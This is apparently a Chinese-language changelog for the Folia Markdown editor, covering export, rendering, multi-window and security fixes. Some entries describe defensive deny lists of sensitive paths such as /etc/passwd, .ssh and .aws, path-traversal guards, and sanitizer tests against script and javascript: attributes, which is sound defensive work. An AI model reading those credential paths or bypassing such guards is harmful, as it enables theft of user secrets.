- **表格列隐藏规则**（v0.7，ROADMAP）：在 HTML 表格的 `<table>` 标签上加布尔属性 `data-hide-last-column`（如 `<table data-hide-last-column>`），所有阅读 / 预览 / 导出 surface 隐藏该表格的最后一列。典型场景：证据目录、材料清单表格的最后一列是「内部备注」「状态」等不希望出现在对外预览与导出文档中的辅助列，加上该属性即可在预览和导出时统一隐藏，而源码与主编辑器中仍完整保留。Word / DOCX 导出按表格网格列精确跳过最后一列，正确处理 rowspan / colspan（合并单元格跨越末列时缩减列数）；HTML 预览 / 复制 / 导出与稳定阅读预览给末列单元格注入隐藏样式；主编辑器如实显示完整表格（它是编辑源码的入口）。新增 `fixtures/legal-html-tables/column-hide-demo.md` 样例。

- **Word 导出预设 schema 治理基础**（ISS-181 第一期）：为 JSON 预设引入 `schemaVersion` 版本号（当前 `1`，缺失视为旧预设兼容）与**未知字段诊断**。此前导入器对未知字段完全静默放行——用户写了拼写错误或预留字段（如 `sections`、`headers`）会导入成功但完全不生效，造成「导入成功即已支持」的误解。现在导入器维护一份 `PresetConfig` 字段白名单树作为唯一真源，递归检测用户 JSON 的未知字段，收集为 `warning` 诊断（不阻断导入，字段被忽略）；设置页导入后显示「已导入，但有 N 个字段不被识别：…」琥珀色提示。`html_mapping.selectors` 的自由 CSS 选择器键与 `styles` 注册表的自定义样式名被正确豁免。模板自带 `schemaVersion: 1`。声明高于当前版本时给出诊断。新增 `docs/word-preset-capabilities.md` 能力矩阵文档，列出每个字段在 DOCX 导出 / Word 纸张预览两条管线的支持程度（✅准确 / ⚠️近似 / ❌不支持），作为 ISS-181/182 治理与未来字段扩展的真源。实体能力扩展（H5/H6、任意页眉页脚文本、分节/横向页面、固定列宽等）留待第二/三期。
- **Word 导出支持 H5/H6 标题**（ISS-181 第二期）：此前 Markdown 的 `##### 五级标题` 和 `###### 六级标题` 在导出 Word 时被当作普通正文（parser 正则只到 `#{1,4}`，五六个 `#` 不匹配，整行连同井号原样输出），没有标题层级、无法被 Word 导航窗格识别；而预览侧却能正常渲染成 `<h5>`/`<h6>`，造成预览/导出分裂。现在 `PresetConfig.titles` 新增 `level5`/`level6`，parser 正则放宽到 `#{1,6}` 并映射到 docx 的 `HEADING_5`/`HEADING_6`，4 个内置预设均提供合理默认值（如 report 按 16→15→14pt 递减，legal/academic 沿用正文字号），预览侧补 `--word-heading-5/6-*` 变量与 h5/h6 样式规则，模板与 `markdown_mapping` 增加 `heading5`/`heading6` 示范。新增真实 DOCX XML 回归验证 `<w:pStyle w:val="Heading5/6"/>` 与预设字号。

### Fixed

- **修复粘贴 / 拖入的图片保存后永久丢失的问题**（ISS-179 Phase 3 最小落盘，DEC-119 决策 6/7）：此前粘贴或拖入图片时，编辑器会插入一个临时 `blob:` object URL 作为图片地址，保存（Cmd+S）时该 URL 被原样写进 Markdown 文件。但 `blob:` URL 只在当前应用进程的内存里有效——重启应用后图片永久丢失，文件里只剩指向不存在地址的死链，且图片字节从未真正写入磁盘。现在保存前会把待落盘的图片字节写入文档同目录的 `文档名.assets/` 子目录，并把 Markdown 里的 `blob:` 替换为相对路径 `./文档名.assets/文件名`；重启后图片正常显示。另存为同样在新目录落盘。路径解析与目录创建在 Rust 侧完成，复用 `is_denied_root` 敏感路径黑名单并新增 `..` 路径遍历防护（解析后的资源路径必须落在文档目录之下）。单个资源落盘失败不阻断其余资源与文档保存。
- **修复最近文件过多时首页欢迎区消失且无法滚回的问题**（ISS-183）：当最近文件记录较多（上限 20 条）且路径较长时，首页的「Folia」标题与「打开文件 / 新建」主操作会被顶出视口且无法滚回，用户找不到入口。根因是 `.recent-page` 同时使用 `overflow:auto` + `align-items:center`，内容高于视口时居中把内部容器顶部推到负坐标，滚动条滚不到负位置。现在溢出时改为顶部对齐（少量记录仍视觉居中）、长路径单行省略（完整路径保留在 hover tooltip），并默认只展示前 6 条、底部提供「显示全部 N 条」按钮控制列表高度。新增响应式 E2E 覆盖 20 条长路径在 800×600 / 默认视口下标题与主操作始终可见。
- **修复设置页首次打开短暂白屏 / 近似空白骨架的问题**（ISS-180）：用户首次点击设置后约 300ms 内只能看到对比度极低的骨架，近似白屏。根因有二：① 默认「通用」section 与其它 section 一样走 `React.lazy`，形成外层 SettingsPage + 内层 GeneralSection 双层 Suspense，即便预热，点击时仍要等内层 chunk 解析才渲染真实内容；② 骨架背景 `color-mix(var(--muted) 14%, transparent)` 叠在近白底上对比度过低。现在默认 section 改为静态导入、移出内层 Suspense（随外壳同步渲染，消除第二层调度延迟），骨架对比度提升到可明确感知的「正在加载」状态；并修复设置页 E2E 把 locator 误写成 `{ heading }`（无效字段，退化匹配任意 heading，掩盖 section 未渲染）的缺陷、把冷开预算从 2.5s 收紧到 1s。
- **修复设置页首次打开的骨架闪烁**（ISS-180 续修）：ISS-180 修了内层 `GeneralSection` 的双重 Suspense，但外层 `SettingsPage` chunk 的首次加载等待仍在——用户按 `Cmd+,` 时发起的 `preloadSettingsPage()` 是 fire-and-forget，`setSettingsVisible(true)` 立即触发 `<Suspense fallback>` 渲染骨架，chunk 到达后才替换为真实内容。现在 `Cmd+,` 与工具栏「设置」按钮两条入口都改为 `preloadSettingsPage().then(() => setSettingsVisible(true))`：按下后等几十毫秒换一次性完整内容，与 macOS 偏好设置行为一致。
- **改进 Word 纸张预览的配置映射，消除会误导用户的预览/导出差异**（ISS-182，DEC-123 双管线）：按「快速 HTML 模拟 + 权威 DOCX 导出」定位，修正 4 处「可模拟但当前映射错误」的差异，不动 DOCX 导出管线。① **表格边框宽度**：此前写死 1px，忽略预设 `table.border_width`，现按预设值映射（与 DOCX 侧一致）。② **标题粗体**：此前 H1–H4 无条件硬编码粗体，覆盖了预设的 `bold:false`；现由预设 `bold` 字段驱动，`report` 预设的方正小标宋一级标题、楷体三级标题不再误显粗体。③ **表格被撑大**：Vditor 的 `.vditor-reset table{display:block}` 会破坏表格布局，现用 `display:table !important` 压过。④ **页码缺失**：4 个内置预设默认启用页码、DOCX 导出有页码，但纸张预览此前完全不渲染页码节点（用户预览看不到、导出却有，是明确误导）；现按 `page_number` 配置在纸张页边距区域渲染页脚/页眉页码节点，并为它预留正文高度避免重叠。页码总页数因模拟限制用占位符表示，真实以导出 DOCX 为准。新增单测覆盖表格边框、标题粗体、页码格式化与节点渲染。
- **Word 纸张预览对超高内容块不再静默截断**（ISS-182）：此前单个超长段落、超高表格行或 rowspan 行组超过一页可用高度时，会被纸张 `overflow:hidden` 静默裁掉，用户毫无察觉地看到不完整预览。现在分页逻辑检测到「该块单独一页仍超高」时，产生 `content-overflow-truncated` 诊断并在预览顶部显示明确告警（「第 N 页的某块超过一页高度，预览仅显示顶部部分；导出的 Word 会完整保留」），消除「预览看着完整、实际被截」的误导。新增 `content-overflow-truncated` 诊断码与对应 MediaPlaceholder 文案。
- **补记 Mermaid 流程图节点文字在预览中丢失的修复**（DEC-119 §9.2，随 v0.5.0 发布、commit `ca10dcd`，文档遗漏补记）：Mermaid flowchart 默认 `htmlLabels:true` 把节点文字放在 `<foreignObject>` 内，而 `sanitizeService.ts` 使用的 DOMPurify svg profile 默认剥除 `<foreignObject>`，导致 HTML / Word 预览的流程图出现「有 SVG 框、节点文字全部丢失」的伪渲染（主编辑器因走不同链路不受影响）。现显式 `ADD_TAGS:['foreignObject']` 保留该标签，其内部 HTML 仍按 html profile 清洗（`script` / `on*` 仍剥离，不降安全性）。新增 `e2e/mermaid-fidelity.spec.ts`（节点文字「开始」「结束」可见、mermaid svg `getBBox` 像素非空、`onload=`/`javascript:` 属性剥离 3 用例）与 `sanitizeService.test.ts`（2 用例）作为 ISS-179 §9.2 保真度验收，CI 已接入。

### Changed

- **移除 Toolbar「插入图片」按钮**（DEC-122 收口）：v0.5.0 Wave-1 在一级工具栏加的图片插入按钮经真机使用反馈冗余——粘贴 / 拖入图片已由 `MediaInsertionService` + `ImageAssetStore` 完整覆盖（同一套受管资产路径），单独按钮违反「工具退到背景层」设计原则且挤占工具栏。移除按钮及全部接线（`handleInsertImage` / Tauri 文件选择器逻辑 / `TOOLBAR_INSERT_IMAGE_EVENT` CustomEvent / `WysiwygEditorPane` 监听 / `guessMimeFromName` helper / 三语 i18n / Toolbar 事件测试），保留 paste/drop 受管图片路径。Toolbar 回到「打开 / 保存 / 另存 / 源码 / Word 预览 / HTML 预览 / 设置」简洁布局。

## [0.5.0] - 2026-07-20

### Added

- **DEC-119 / ISS-179 Phase 2/3/4 富媒体治理扩展**：(Phase 2) `WysiwygEditorPane` `input()` 回调在 sanitizeIrDom 完成后立即调 `resolveLocalImages(irParent, filePath)`，让粘贴 / 拖入的相对路径图片无需重开即可显示；新增 `e2e/rich-media-fixture-matrix.spec.ts` 覆盖 relative-png-webp / multi-line-svg / complex-svg-features / missing-image / corrupt-image / illegal-mermaid 6 个 fixture 端到端就绪断言（无 pageerror + 主 IR / 预览面板可见）。(Phase 3) 新增 `src/services/imageAssetService.ts`（DEC-121）受管图片资源骨架：sha-256 hash 去重、`sanitizeFileName` / `resolveAssetFileName` 纯函数、pending↔persisted state machine、object URL 与相对路径切换；14 个 vitest 用例覆盖。Phase 3 后续 Rust asset scope / Vditor toolbar 接入留给独立 PR。(Phase 4) `.github/workflows/ci.yml` 新增 `playwright` job：ubuntu-latest + 安装 Chromium with-deps + 跑 `e2e/rich-media-cross-surface.spec.ts` + `e2e/rich-media-fixture-matrix.spec.ts` + `e2e/mermaid-ir-renders.spec.ts`；failure 上传 test-results / playwright-report 为 7 天 artifact。同时修复 `e2e/mermaid-ir-renders.spec.ts` 使用绝对 URL 绕开 Playwright 1.60.0 baseURL fixture 间歇性 undefined 的问题，让 CI 矩阵 10/10 全绿。修复 `WysiwygEditorPane.tsx` 与 `vditorIrSanitizeService.ts` 中把 DEC-118 误写为 DEC-119 的历史归属混淆。实测：vitest 408 / 408 + Playwright 10 / 10 + typecheck / lint / build 全绿。
- **DEC-119 / ISS-179 Phase 1 富媒体统一渲染协调器（RenderCoordinator）落地**：新增 `src/services/renderCoordinator.ts`（DEC-120），`createRenderCoordinator()` 工厂 + `renderMarkdownArtifact(source, options)` 契约（surface / filePath / generation / signal）。generation 单调递增，旧 generation 完成被丢弃；AbortSignal.abort() 让当前 generation resolve 为 aborted artifact；5s 软超时返回 timeout diagnostics；MutationObserver 等待 `.language-mermaid` SVG / `.language-math` KaTeX 终态，不再依赖 `after()` / `data-render="1"`。`src/services/wordPreviewArtifactService.ts` 改造 `createWordPreviewArtifact` 走 coordinator；`src/components/WechatPreviewPane.tsx` HTML 预览通过 coordinator 取得稳定 artifact；`src/components/WordPaperPreviewPane.tsx` 通过 `createWordPreviewArtifact` 自动受益。Phase 0 红测试 4 vitest + 3 Playwright 全部转绿，原 388 个 vitest 测试保持绿，`npm run typecheck` / `lint` / `build` 全绿。Playwright 关键转变：HTML 复制从 graph TD 源码 → 完整 mermaid SVG；Word 预览 `panelHasGraphTd=true` → `false`；跨 surface 一致性 `wechatHasGraphTd=true` → `false`。
- **DEC-119 / ISS-179 Phase 0 富媒体统一渲染契约 fixture 与失败测试**：为后续 RenderCoordinator / ResourceResolver / DiagramAsset 落地准备可公开、机器可读的富媒体 fixture 与确定性红测试。新增 `fixtures/rich-media/`（13 Markdown 场景 + 7 个 1×1 PNG/WebP/CJK/space/emoji/corrupt 资产 + README + manifest.json，共 92KB）；新增 `src/__tests__/rich-media/delayed-renderer.test.ts`（2 用例）验证 50ms 后到的 mermaid SVG 必须进入 HTML artifact / Word artifact；新增 `src/__tests__/rich-media/a-b-out-of-order.test.ts`（4 用例）锁定 RenderCoordinator generation / cancellation 契约，导入未来 Phase 1 必须建立的 `src/services/renderCoordinator.ts`；新增 `e2e/rich-media-cross-surface.spec.ts`（3 用例）把 2026-07-12 真实 Tauri v0.4.7 生产探针「主 IR 含 SVG / HTML 复制无 SVG / Word 预览 svg=0」转正为正式门禁。基线对照：原 388 个 vitest 仍全绿，Phase 0 新增 4 个 vitest / 3 个 Playwright 用例全部为红，符合「先红后绿」的 Phase 0 gate。结果凭证与失败输出见 `docs/dec-119/phase0/RESULT.md`。

## [0.4.7] - 2026-07-07

### Fixed

- **修复主编辑器 IR 模式下 Mermaid / ECharts / KaTeX / flowchart / plantuml / graphviz / markmap / mindmap / abc / smiles 等 Vditor 自渲染围栏不显示的问题**（ISS-63 / DEC-118）：v0.4.5 / v0.4.6 桌面包里，含这些围栏的 Markdown 文档在主编辑器只显示围栏源码、不渲染成图。根因是 `vditorIrSanitizeService.sanitizeVditorIrHtml` 在 `WysiwygEditorPane.after()` / `input()` / `setValue()` RAF 回调中同步用 DOMPurify 整体重写整个 IR DOM（`USE_PROFILES: { html, svg, svgFilters }`），与 Vditor 内部 mermaid / echarts 等异步代码块渲染器产生 detached-node 写入竞争——folia sanitize 跑完后旧节点全 detached，Vditor 异步加载完成（实测 Network 200 OK）调 `item.innerHTML = svg` 写到了 detached 节点上，新 IR DOM 永远停在占位。修复采用方案 A + B 组合：方案 A 在 DOMPurify 处理前后保留 `.vditor-ir__preview[data-render="1"]` 的 innerHTML（还原前再过一遍 sanitizeForVditor 防 mermaid CVE 类产物含恶意 svg 绕过 sanitize 防线），防御 sanitize 期间已渲染完成的代码块产物被破坏；方案 B 在 `sanitizeIrDom` 完成后重跑 Vditor 静态渲染方法（`Vditor.mermaidRender` / `Vditor.mathRender` / `Vditor.flowchartRender` / `Vditor.plantumlRender` / `Vditor.graphvizRender` / `Vditor.markmapRender` / `Vditor.mindmapRender` / `Vditor.chartRender` / `Vditor.abcRender` / `Vditor.SMILESRender`），cdn / theme / math options 从 editor 实例动态拿（避免 hardcoded 主题与编辑器切换不一致），`editor.constructor` 拿 Vditor 类引用避免二次 `await import('vditor')` 在 vitest jsdom + React act microtask 链 flake。`try/catch` 防 unhandled rejection + 卸载竞态检查防 await 期间 editor 被 cleanup 销毁。addScript 二次调用因 script 标签已存在会直接 resolve；mermaid.render / echarts.init 等渲染部分会重新跑，把 svg / canvas 写入 sanitize 后的新 IR DOM 活节点。这是 v0.4.4 / v0.4.5（DEC-112 / DEC-114 修 SVG 渲染）引入的回归。`e2e/mermaid-ir-renders.spec.ts` 新增 Playwright 回归：修复前 `hasSvg: false`，修复后 `hasSvg: true, svgCount: 1` 且 preview innerHTML 含 `<div class="language-mermaid" data-processed="true"><svg id="mermaid..." class="flowchart">...</svg></div>`；用 `expect.poll` 智能轮询所有 mermaid preview 节点出现 svg。截图 `/tmp/folia-iss63-mermaid.png` 显示完整 flowchart（"开始 → 条件判断 → 处理1/处理2 → 结束"）。`npm run typecheck` / `lint` / `test`（47 文件 / 388 测试，3 连稳）/ `build` / `cargo check` 全绿。PR #64 / 见 [docs/DECISIONS.md](../docs/DECISIONS.md) DEC-118。

## [0.4.6] - 2026-06-26

### Fixed

- **修复 HTTPS 图片（含 WebP）在主编辑器 / 预览窗不显示的问题**（ISS-178 / DEC-116）：`src-tauri/tauri.conf.json` 的 CSP `img-src` / `media-src` 此前只放行 `'self' asset: http://asset.localhost data: blob: file:`，任何 `https://` 来源的 `<img>` / `<source>` / `<video>` 都会被 WebView 拒绝加载——`<img>` 节点能进 DOM，但浏览器拦截图片数据，表现为"图片语法在、图片本身没法渲染"。用户报告的具体场景是腾讯云 COS 上的 WebP（`https://xierluo-1257032130.cos.ap-shanghai.myqcloud.com/...webp`），但根因与 WebP 无关，是 CSP 不允许 `https:` 协议。修复：在 `img-src` / `media-src` 加上 `https:`；`connect-src` / `frame-src` / `font-src` 维持原状，避免放开脚本 fetch 与 iframe 来源。`src/services/tauriCapabilities.test.ts` 增加 `expect(csp).toMatch(/img-src [^;]*\bhttps:/)` 与 `expect(csp).toMatch(/media-src [^;]*\bhttps:/)` 两条断言守住，防止后续 CSS 改动再把 `https:` 删掉。PR #62 / 验证：Vite dev + Playwright 探针 HTML 注入与 Tauri 一致的 CSP，修复前 3 张 HTTPS 图 naturalW=0 + console 4 条 CSP error；修复后 COS WebP naturalW=1280×720、gstatic WebP naturalW=550×368、console 0 error；Tauri dev + osascript 加载 `test.md` 实测 4 种引用方式（含本地 WebP、inline HTML、HTTPS、绝对路径）全部正常渲染。`npm test` 47 / 388、`npm run typecheck` / `lint` / `build`、`cargo check` 全绿。

## [0.4.5] - 2026-06-23

### Fixed

- 修复部分多行 SVG 后方仍出现大段白色条的问题（DEC-114 / PR #61）：Vditor IR 在清洗后会把部分 SVG 子片段（尤其是 `<path>`）降级成普通段落，旧的 SVG 修复器只沿相邻 IR HTML 节点收集，遇到普通段落就停止，导致“初版 Skill 的文件结构”等图后方残留空白源码块。现在 source-aware SVG 修复会按原始 Markdown SVG 源码顺序继续识别并隐藏后续残留片段，同时保留图注和正文；Playwright 注入用户 `ch07.md` 实测 7 张 SVG 全部恢复且无可见残留，session 仍保持未修改。
- 修复主编辑器内 SVG 文本继承 `<pre>` 等宽字体的问题（DEC-114 / PR #61）：部分 AI 生成 SVG 未指定 `font-family`，在 Vditor IR 预览中会继承代码块字体，导致长英文标签比原设计更宽，看起来像被框或白底截掉。现在修复后的 SVG 预览使用阅读正文字体；“初版 Skill 的文件结构”根节点文字宽度实测由约 285px 降为约 226.6px，可正常落在 240px 蓝框内。

## [0.4.4] - 2026-06-22

### Fixed

- **修复 Markdown 内联 SVG 在主编辑器、HTML 预览、Word 预览中被截断或变白的问题**（ISS-176 / DEC-112）：Vditor IR / Lute 会把漂亮排版的多行 SVG 拆成多个 `html-block`，部分 SVG 的 marker 还会被截成只有背景 `<rect>` 的片段；旧清洗逻辑会把这些片段补闭合并回写到会话，导致右侧预览也拿到污染内容。Folia 现在按原始 Markdown SVG 块修复 IR 可见预览，安全跳过无害 SVG 片段 marker 的单独清洗，并在 Vditor preview 前用占位符保护完整 SVG；HTML/Word 预览会移除 Vditor 复制按钮等 preview chrome。Playwright Chromium 注入用户 `ch07.md` 实测：主编辑器、HTML 预览、Word 预览测量层和分页层均为 7 张完整 SVG，初始化后 session 仍保持干净。
- **tear-off 独立窗口显式 destroy() 兜底**（PR #54 cherry-pick）：`on_window_event(CloseRequested)` 处理 tear-off 窗口时，`handle_window_close` emit `window:closed` 后追加 `window.destroy()`，应对 macOS 上偶发的 CloseRequested 默认不销毁窗口问题（PR #54 报告）。destroy() 不再触发 CloseRequested，无递归。主窗口维持 v0.4.3 的「关窗即退出」语义（不引入 PR #54 提议的 hide-to-Dock 模式）。**范围**：tear-off 路径才走 destroy；main 路径维持默认 close 行为。

## [0.4.3] - 2026-06-21

### Fixed

- **macOS 红绿灯 / 标题栏 X 关窗失效**（v0.4.2 hotfix）：`useSession` 注册的 `getCurrentWindow().onCloseRequested(() => { flush(); })` handler 在 macOS Tauri 2.11.0 上误拦截 close——即便未调用 `preventDefault()`，窗口也不再自动 destroy。修复：移除 JS onCloseRequested 注册；Rust `on_window_event(CloseRequested)` handler（`lib.rs:496`）已承担独立窗口 tab 回收 + `window:closed` emit，不阻塞关窗。保留 `pagehide` / `beforeunload` 浏览器级事件供 Cmd+Q / 刷新 / 切后台等场景 flush state。**影响范围**：v0.4.2 的 macOS 主窗口与独立 tear-off 窗口均受影响，用户实测发现红绿灯 / 标题栏 X 点击无效。DEC-108「关窗前 dirty confirm」延后——若需 onCloseRequested 拦截，需先研究 Tauri 2.11 的 close 行为或显式调用 `window.destroy()`。

## [0.4.2] - 2026-06-21

### Fixed

- **恢复 vitest 测试套件**（ISS-171）：v0.3.19 起 React 19 production 构建不再导出 `act`，所有 `import { act } from 'react'` 的 `.test.tsx` 测试报 `act is not a function`（共 11 个文件、39 个用例）；同时 4 个用 `node:fs` / `node:path` 的测试在 jsdom 环境下被 vite externalize 报 `No such built-in module`。本仓库此前无 CI 跑测试，回归一路畅通至 v0.4.1 release。修复：vitest worker 显式设 `env.NODE_ENV=development`，加载 `react.development.js` 让 `act` 可用；同时 4 个 node-only 测试加 `// @vitest-environment node`，docxXml 额外手动注入 jsdom 的 `document` / `window` / `DOMParser` / `Node` 满足 table-handler 解析需求。修复后 vitest 368/368 全绿（修复前 43 failed）。
- **read/write_opened_document 补敏感路径黑名单**（ISS-172）：与 ISS-162 `watch_path` 共享同一份 `DENY_PATH_PREFIXES`，防止前端或被 XSS 注入的代码用合法后缀 `.md` / `.html` 旁路读取 `/etc/passwd` / `C:\Windows\System32` / `.ssh` 等敏感文件。`is_denied_root` 在扩展名校验之后立即检查，命中即拒绝（不读 metadata，避免提前暴露存在性）。新增 3 个 Rust 单测覆盖读 / 写拒绝黑名单 + 普通路径不受影响。

### Changed

- **新增 CI workflow**（ISS-173）：`.github/workflows/ci.yml` 在 push / PR 触发，跑 `npm ci` → `npm run typecheck` → `npm run lint` → `npm test` → `npm run build`（ubuntu-latest）。`CONTRIBUTING.md` §3.1 新增「CI 必须绿」硬性 gate 说明。Tauri 编译与 Gitee 同步继续由 `release.yml` 负责；桌面端真机复测由开发者本地跑 `npm run etv:run`（不进 CI）。

### Fixed

- **tear-off 独立窗口顶部白线**（ISS-174）：`create_tab_window` builder 链补齐与主窗口一致的窗口装饰（macOS `TitleBarStyle::Overlay` + `hidden_title(true)` + `traffic_light_position(16, 16)`，Windows / Linux 显式 `decorations(true)`），消除 NSWindow 标题栏分隔白线，让红绿灯 overlay 在工具栏左侧。
- **tear-off 改为纯 drag，移除「弹出此标签」按钮 + toolbar X 关闭按钮**（DEC-110 / ISS-174 follow-up）：用户反馈 tear-off 体验与浏览器不一致——tab 上 ⤴ 按钮 + 独立窗口 toolbar 右侧 X 关闭按钮让独立窗口看起来像「附属页面」。修改后：tear-off 仅靠 HTML5 drag；关闭独立窗口走 OS 原生红绿灯 / Windows 标题栏 X（与浏览器一致）；drag-out 仅在源窗口 ≥2 tab 时启用（单 tab 窗口禁 drag，避免 drag-out 后源窗口变空）。同步清理 dead code：`tabWindowService.confirmCloseWindowWithDirty` + `useSession.tearOffTab` 包装层 + `sessionReducer` 'tearOffTab' action 全部移除。
- **drag tab 到空白处创建新独立窗口**（DEC-111）：DEC-110 移除 tear-off 按钮后，补齐「drag 一个 tab 到空白处 → 自动创建新独立窗口并把该 tab 从源窗口移除」的浏览器范式入口（dropEffect === 'none' 触发 `tearOffViaDrag`）。同窗口 drag 不误触发 tear-off（drop accepted）。新增 `TabBar.handleDragEnd` + `useSession.tearOffViaDrag` callback + `AppLayout` 接线。**遗留（DEC-108）**：dirty 拦截整体方案需走 Rust `OnCloseRequested` + `prevent_close()` 重做（独立后续项）——当前 dirty tab 关窗时经 `window:closed` 事件回到主窗口，dirty 标记保留在缓存里，无数据丢失，DEC-108 仅是关窗前 confirm 的 UX 打磨。

## [0.4.1] - 2026-06-20

### Fixed

- **恢复 macOS 自动更新**（DEC-106）：v0.4.0 `bundle.targets: ["dmg", "nsis"]` 删掉了 macOS 的 `"app"` target（updater binary），且 `release.yml` 的 `includeUpdaterJson: false` 让 tauri-action 不生成 .sig——双重原因导致 macOS runner 没生成 `.app.tar.gz` / `.app.tar.gz.sig`，publish job `gh release download --pattern "*.sig"` 拿不到，latest.json 缺 darwin-aarch64 / darwin-x86_64 entry，应用内「检查更新」无法拉到 v0.4.0。修复：`bundle.targets` 加回 `"app"` + `includeUpdaterJson` 改回 `true`，v0.4.1 latest.json 三平台签名齐全。3 次 CI 重打（每次都有真实进展）后发布成功，9 个产物齐全。

## [0.4.0] - 2026-06-20

### Changed

- 本地相对路径资源解析增加路径遍历防护并扩展覆盖范围（ISS-160 / DEC-098）。**越界防护**：`resolveLocalResourcePath` 新增 `isSensitivePath` 黑名单，拒绝解析后落在敏感系统 / 凭据目录（`/etc` `/System` `/var` `/usr` `.ssh` `.gnupg` `.aws` `C:\Windows` 等）的相对路径；保留合法 `../` 上级引用（律师文档常把图片放共享上级 `证据/` 目录，不破坏现有文档）。**扩展范围**：`resolveLocalImages` 从仅 `<img src>` 扩展到 `<source src>`、`<video poster>`、`<img>` / `<source>` 的 `srcset`、CSS `background-image: url(...)`（inline `style` + `<style>` 块）。外部 / 越界 / 无法解析的资源保留原属性、不抛错。
- 内测授权码由 `FOLIA-BETA-2026` 改为 `ywxlaw`（用户微信号，便于识别归属；大小写不敏感，输入经 `toUpperCase` 归一化）（ISS-165, PR #44）。
- 精简 Release 构建产物（DEC-093）：`src-tauri/tauri.conf.json` 的 `bundle.targets` 由 `"all"` 收窄为 `["dmg", "nsis"]`，Windows 不再生成冗余的 MSI 安装包，只保留 NSIS `.exe`；macOS 仍生成 `.dmg`。自动更新专用的 `.app.tar.gz` / `.nsis.zip` + `.sig` 产物不受影响（Tauri updater 依赖，无法精简）。
- 标签栏并入顶部工具栏同一行（ISS-40）：替代原先独立一行 + 中间「当前文件名」区，文件名改由标签承载，减少一行垂直占用；`.toolbar-title` 由绝对定位居中改为 flex 占据中间并移除 `.toolbar-spacer`；标签与「新建」按钮加 `data-no-window-drag` 隔离窗口拖拽。
- 标签页 / 最近文件首页 / 标签右键菜单接入 i18n（ISS-40）：`TabBar` / `RecentFilesPage` / `ContextMenu` 按项目统一模式（`useSettings` + `translate`）补 `zh-CN` / `en-US` / `ja-JP` 三语，替换原硬编码中文。
- `StatusBar` 全面接入 i18n（zh-CN / en-US / ja-JP，顺带 ISS-150），并新增「重新加载中 / 文件已丢失 / 草稿过大未自动保存」三态提示（ISS-42）。

### Added

- 多窗口 tear-off tab / merge-back tab（ISS-164 / DEC-102）：主窗口 tab 拖出（或点标签「弹出此标签」按钮）→ Rust `create_tab_window` command 用 `WebviewWindowBuilder` 创建独立窗口（URL `?mode=tab-window&label=...`）；独立窗口 tab bar 拖 tab 回主窗口 → tab 合并回主窗口 + 源窗口空则自动关闭。**session 方案 1（YAGNI）**：保持前端 `useSession`（useReducer + localStorage），不把 session 移到 Rust（后续 ISS，方案 3），窗口间通过 Tauri event bus 同步 `tab:tear-off` / `tab:merge-back` / `session:full-sync` / `window:closed` / `tab:drop-requested`，last-write-wins 持久化；Rust 只追踪 `label → tabIds` 映射用于关闭时回收残余 tab。**Rust 新增**：`create_tab_window` / `update_tab_window_tabs` / `close_tab_window` commands，`.on_window_event(CloseRequested)` 监听器 emit `window:closed { label, remainingTabIds }`；`is_valid_tab_window_label` 字符集 + 长度校验；8 个新单测覆盖 label 校验、Mutex 读写、urlencode、多窗口共存。**前端新增**：`src/services/tabWindowService.ts`（IPC 封装，懒监听 + payload 校验 + 非 Tauri 短路）、`src/hooks/useTabWindowSync.ts`（跨窗口事件订阅 → 本地 dispatch）、`src/components/tabDragPayload.ts`（HTML5 drag dataTransfer 序列化 + 解码）、`src/services/tabWindowService.test.ts`（27 个单测覆盖监听 / emit / 反注册 / 常量）；`sessionReducer` 新增 `tearOffTab` / `removeTabById` / `receiveTab` / `windowClosed` actions；`useSession` 暴露 `tearOffTab` / `mergeBackTab` 并接入跨窗口事件订阅；`TabBar` 支持 HTML5 drag + 「弹出此标签」按钮（占位标签不可拖出，dataTransfer 用 `application/x-folia-tab` MIME）；`AppLayout` 接入 `windowLabel` + `handleTearOff` + `handleMergeBackDrop`；`capabilities/default.json` 增加 `core:webview:allow-create-webview-window` 等多窗口权限 + `windows` 含 `tab-window-*` glob。**不在本期范围**：跨独立窗口拖 tab（独立 A → 独立 B）、拖到精确 drop index、session 移到 Rust 权威、独立窗口位置记忆、macOS WKWebView 实测（由开发者本地 `npm run etv:run` 复测）。
- 文件外部改动监听安全模式（ISS-162）：Rust 后端基于 `notify = "6"`（实际解析到 6.1.1）实现 `watch_path` / `unwatch_path` Tauri command，监听句柄存 `AppState` 全局 HashMap；前端 `src/services/fileWatchService.ts` 订阅 `watch:changed` / `watch:error` 事件，监听失败不 panic，统一通过 `app.emit("watch:error", ...)` 上抛。**安全防御**（参考同类 Electron Markdown 编辑器的系统级路径防护）：`validate_watch_path` 拒绝相对路径、命中系统根黑名单（`/` `/dev` `/etc` `/system` `/system/volumes` `C:\Windows` `C:\$Recycle.Bin`，大小写不敏感、跨平台分隔符统一）、不存在路径；macOS HFS+/APFS 与 Windows NTFS 默认大小写不敏感场景统一做 `to_ascii_lowercase` 处理。**资源回收**：`unwatch_path` 幂等（已取消 / 黑名单 / 不存在路径均返回 Ok，便于关 tab 时无脑 unwatch）；重复监听同路径直接覆盖不泄漏句柄；`last_event` 时间戳为 atomic-replace 轮询补 `notify` 漏事件预留去重点。事件载荷 `{ path, kind: "modify" | "create" | "remove" }` 复用 ISS-043 `pathInvalid` 概念，前端可基于路径匹配活跃 tab 提示「文件已外部修改」。`src-tauri/src/lib.rs` 新增 13 个 Rust 单测覆盖黑名单、相对路径、大小写不敏感、100 次 watch/unwatch 不泄漏、`last_event` 时间戳推进。
- 最近文件首页支持删除单个记录与清空全部（ISS-167）：每条最近文件右侧加「×」移除按钮（hover 变红），列表标题区加「清空最近」按钮（点击弹原生确认对话框防误操作）。`sessionReducer` 新增 `removeRecentFile` / `clearRecentFiles` action，`useSession` 暴露对应方法，删除 / 清空随会话持久化。
- 标签右键菜单增强（ISS-40）：屏幕边界自动翻转（`computeMenuPosition` 纯函数，溢出视口时左移 / 上移）、`↑/↓` / `Home/End` 键盘导航、占位标签（`isPlaceholder`）只显示「关闭」并隐藏「关闭其他 / 关闭右侧 / 全部关闭」。
- 大文件降级标签（>256KB 草稿未落盘）的失效与重读体验（ISS-42）：磁盘文件被删 / 移动导致重读失败时 `Tab` 标记 `pathInvalid`，状态栏显示「文件已丢失」并提供「另存为」；重读期间状态栏显示「重新加载中」；草稿过大未落盘显示「草稿过大未自动保存」。`reloading` 由 `activeTab` 派生，避免 effect 内 set state。
